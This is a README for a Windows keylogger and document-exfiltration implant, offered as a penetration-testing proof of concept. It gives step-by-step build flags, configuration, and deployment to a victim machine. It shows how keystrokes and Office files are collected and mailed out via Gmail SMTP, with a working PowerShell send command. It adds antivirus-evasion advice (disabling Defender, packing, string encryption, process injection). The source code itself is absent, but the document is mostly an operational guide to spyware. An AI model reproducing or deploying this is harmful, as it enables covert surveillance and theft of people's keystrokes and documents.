Windows Keylogger & Document Exfiltrator
A proof-of-concept Windows implant that logs keystrokes, collects Office documents, and exfiltrates them via Gmail SMTP. Built for authorized penetration testing and red team engagements.

⚠️ Legal Notice
This tool is intended only for authorized security assessments on systems you own or have explicit written permission to test. Unauthorized use is illegal. The author assumes no liability for misuse.

Features
Keystroke Logging — Captures virtual key codes via a low-level keyboard hook (WH_KEYBOARD_LL)
Document Collection — Scans Documents and Desktop folders for .docx and .xlsx files
Deduplication — Tracks already-sent files via doc_sent.log to avoid re-sending
ZIP Compression — Packages collected documents into a ZIP archive using PowerShell's System.IO.Compression
Email Exfiltration — Sends keylog + document archive as attachments via Gmail SMTP (TLS on port 587)
Debug Logging — Writes a timestamped debug log to trace execution flow
Persistence-Ready — Runs hidden (-mwindows), suitable for scheduled task or startup folder deployment
Architecture



collector.exe
├── KeyloggerThread        ← Low-level keyboard hook, writes to kl.dat
├── Main Loop (60s cycle)  ← Collect docs → ZIP → Email via PowerShell
└── Debug Log              ← Writes to collector_debug.log
File Paths (on victim)


File	Purpose
C:\Windows\Temp\kl.dat	Keystroke log
C:\Windows\Temp\kl_attachment.dat	Temp copy for email attachment
C:\Windows\Temp\collected\	Staging directory for found documents
C:\Windows\Temp\data.zip	Compressed document archive
C:\Windows\Temp\doc_sent.log	Tracks already-exfiltrated files
C:\Windows\Temp\send_mail.ps1	Auto-generated PowerShell email script
C:\Windows\Temp\collector_debug.log	Debug log for troubleshooting
Requirements
Compiler: MinGW-w64 (GCC)
Target Windows: 7/10/11 (x64)
Gmail Account: With App Password enabled (app password, not regular password`
Defender: Windows Defender may flag the binary — add exclusions or disable real-time monitoring during testing
Compilation
powershell



gcc -o collector.exe collector.c -luser32 -lgdi32 -lshell32 -ladvapi32 -O2 -s -mwindows


Flag	Purpose
-luser32 -lgdi32 -lshell32 -ladvapi32	Link required Windows API libraries
-O2	Optimize for size/speed
-s	Strip debug symbols
-mwindows	Run without a console window (GUI subsystem)
Configuration
Edit the #define block at the top of collector.c:

c



#define SMTP_SERVER     "smtp.gmail.com"
#define SMTP_PORT       587
#define EMAIL_FROM      "youraccount@gmail.com"
#define EMAIL_TO        "target@gmail.com"
#define EMAIL_SUBJECT   "Pentest Data Collection"
#define EMAIL_USER      "youraccount@gmail.com"
#define EMAIL_PASS      "xxxx xxxx xxxx xxxx"   // Gmail App Password
Usage
Compile the binary
Transfer to the target (AnyDesk, USB, SMB share, etc.)
Run:
powershell



# Deploy
copy collector.exe C:\ProgramData\

# Execute
C:\ProgramData\collector.exe

# Verify it's running
Get-Process -Name collector

# Check debug log after ~2 minutes
Get-Content "C:\Windows\Temp\collector_debug.log"
The implant runs on a 60-second loop:

Collects new .docx/.xlsx files from %USERPROFILE%\Documents, Desktop, and C:\Users\Public\Documents
Compresses them into data.zip
Attaches both keylog.txt and data.zip to an email
Sends via Gmail SMTP
Clears the keylog for the next cycle
Evasion Notes
Antivirus: MinGW-compiled binaries are commonly detected. Consider:
Obfuscation / packing (UPX, etc.)
Custom encryption of strings at rest
Process injection techniques
Firewall: Outbound SMTP on port 587 must be allowed — or use a different exfil channel
App Passwords: Gmail app passwords are 16 characters with spaces. If the password contains special characters, escape them properly in the C string
Debugging
If emails don't arrive, check:

Process is running:
powershell



Get-Process -Name collector
Debug log contents:
powershell



Get-Content "C:\Windows\Temp\collector_debug.log"
Keylog file exists:
powershell



Get-Item "C:\Windows\Temp\kl.dat"
PowerShell script was created:
powershell



Test-Path "C:\Windows\Temp\send_mail.ps1"
Test SMTP directly:
powershell



$smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential('youraccount@gmail.com', 'app-password')
$smtp.Send('youraccount@gmail.com', 'target@gmail.com', 'Test', 'SMTP direct test')
Limitations
Keylog Format: Captures virtual key codes (VK), not character output. Useful for detecting activity and patterns, not for direct text reconstruction
Gmail Dependency: Requires a working Gmail account with app password access
No Persistence: Must be deployed manually or via a separate persistence mechanism (scheduled task, startup folder, etc.)
Single Binary: No C2, no encryption, no process injection — bare-minimum implant
License
For authorized security testing and educational purposes only.`